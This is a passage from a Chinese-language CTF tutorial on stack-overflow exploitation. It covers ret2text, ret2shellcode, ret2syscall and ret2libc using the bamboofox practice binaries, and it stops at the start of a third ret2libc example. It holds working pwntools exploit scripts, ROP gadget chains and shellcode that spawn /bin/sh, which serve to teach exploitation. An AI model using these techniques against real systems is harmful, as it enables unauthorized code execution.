<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There is something amazing here, do you know anything?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Maybe I will tell you next time !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p>
<pre><code>.text:080485FD secure          proc near
.text:080485FD
.text:080485FD input           = dword ptr -10h
.text:080485FD secretcode      = dword ptr -0Ch
.text:080485FD
.text:080485FD                 push    ebp
.text:080485FE                 mov     ebp, esp
.text:08048600                 sub     esp, 28h
.text:08048603                 mov     dword ptr [esp], 0 ; timer
.text:0804860A                 call    _time
.text:0804860F                 mov     [esp], eax      ; seed
.text:08048612                 call    _srand
.text:08048617                 call    _rand
.text:0804861C                 mov     [ebp+secretcode], eax
.text:0804861F                 lea     eax, [ebp+input]
.text:08048622                 mov     [esp+4], eax
.text:08048626                 mov     dword ptr [esp], offset unk_8048760
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system</code></pre><p>在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。</p>
<p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p>
<pre><code>.text:080486A7                 lea     eax, [esp+1Ch]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets</code></pre><p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下</p>
<pre><code>gef➤  b *0x080486AE
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
gef➤  r
There is something amazing here, do you know anything?

Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24      gets(buf);
───────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebx   : 0x00000000
$ecx   : 0xffffffff
$edx   : 0xf7faf870  →  0x00000000
$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebp   : 0xffffcdc8  →  0x00000000
$esi   : 0xf7fae000  →  0x001b1db0
$edi   : 0xf7fae000  →  0x001b1db0
$eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;</code></pre><p>可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断</p>
<ul>
<li>s 的地址为 0xffffcd5c</li>
<li>s 相对于 ebp 的偏移为 0x6c</li>
<li>s 相对于返回地址的偏移为 0x6c+4</li>
</ul>
<p>最后的 payload 如下：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">##!/usr/bin/env python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2text'</span><span class="token punctuation">)</span>
target <span class="token operator">=</span> <span class="token number">0x804863a</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x6c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener">ret2shellcode</a></p>
<p>首先检测程序开启的保护</p>
<pre><code>➜  ret2shellcode checksec ret2shellcode
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments</code></pre><p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No system for you this time !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strncpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye bye ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>
<pre><code>.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]</code></pre><p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p>
<pre><code>gef➤  b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 

Breakpoint 1, main () at ret2shellcode.c:8
8       setvbuf(stdout, 0LL, 2, 0LL);
─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
      6  int main(void)
      7  {
 →    8      setvbuf(stdout, 0LL, 2, 0LL);
      9      setvbuf(stdin, 0LL, 1, 0LL);
     10  
─────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x8048536 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap 
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx 
0xf7fd3000 0xf7fd5000 0x00000000 rwx 
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx 
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]</code></pre><p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限</p>
<pre><code>0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</code></pre><p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p>
<p>具体的 payload 如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
buf2_addr <span class="token operator">=</span> <span class="token number">0x804a080</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
<h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 bamboofox 中的 ret2syscall 为例</p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener">ret2syscall</a></p>
<p>首先检测程序开启的保护</p>
<pre><code>➜  ret2syscall checksec rop
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/系统调用" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li>
</ul>
<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>
<pre><code>execve("/bin/sh",NULL,NULL)</code></pre><p>其中，该程序是 32 位，所以我们需要使得</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb</li>
<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
<p>首先，我们来寻找控制 eax 的 gadgets</p>
<pre><code>➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</code></pre><p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p>
<p>类似的，我们可以得到控制其它寄存器的 gadgets</p>
<pre><code>➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret</code></pre><p>这里，我选择</p>
<pre><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></pre><p>这个可以直接控制其它三个寄存器。</p>
<p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p>
<pre><code>➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh</code></pre><p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p>
<pre><code>➜  ret2syscall ROPgadget --binary rop  --only 'int'                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4</code></pre><p>同时，也找到对应的地址了。</p>
<p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span>

pop_eax_ret <span class="token operator">=</span> <span class="token number">0x080bb196</span>
pop_edx_ecx_ebx_ret <span class="token operator">=</span> <span class="token number">0x0806eb90</span>
int_0x80 <span class="token operator">=</span> <span class="token number">0x08049421</span>
binsh <span class="token operator">=</span> <span class="token number">0x80be408</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> pop_eax_ret<span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">,</span> pop_edx_ecx_ebx_ret<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> binsh<span class="token punctuation">,</span> int_0x80<span class="token punctuation">]</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
<h3 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h3><p>我们由简单到难分别给出三个例子。</p>
<h4 id="例-1"><a href="#例-1" class="headerlink" title="例 1"></a>例 1</h4><p>这里我们以 bamboofox 中 ret2libc1 为例</p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="noopener">ret2libc1</a></p>
<p>首先，我们可以检查一下程序的安全保护</p>
<pre><code>➜  ret2libc1 checksec ret2libc1    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+1Ch] [bp-64h]@1</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"RET2LIBC >_&lt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p>
<pre><code>➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
Strings information
============================================================
0x08048720 : /bin/sh</code></pre><p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p>
<pre><code>.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</code></pre><p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc1'</span><span class="token punctuation">)</span>

binsh_addr <span class="token operator">=</span> <span class="token number">0x8048720</span>
system_plt <span class="token operator">=</span> <span class="token number">0x08048460</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> system_plt<span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span> binsh_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>
<p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p>
<h4 id="例-2"><a href="#例-2" class="headerlink" title="例 2"></a>例 2</h4><p>这里以 bamboofox 中的 ret2libc2 为例</p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="noopener">ret2libc2</a></p>
<p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">##!/usr/bin/env python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc2'</span><span class="token punctuation">)</span>

gets_plt <span class="token operator">=</span> <span class="token number">0x08048460</span>
system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span>
pop_ebx <span class="token operator">=</span> <span class="token number">0x0804843d</span>
buf2 <span class="token operator">=</span> <span class="token number">0x804a080</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> gets_plt<span class="token punctuation">,</span> pop_ebx<span class="token punctuation">,</span> buf2<span class="token punctuation">,</span> system_plt<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">,</span> buf2<span class="token punctuation">]</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p>
<h4 id="例-3"><a href="#例-3" class="headerlink" title="例 3"></a>例 3</h4><p>这里以 bamboofox 中的 ret2libc3 为例</p>
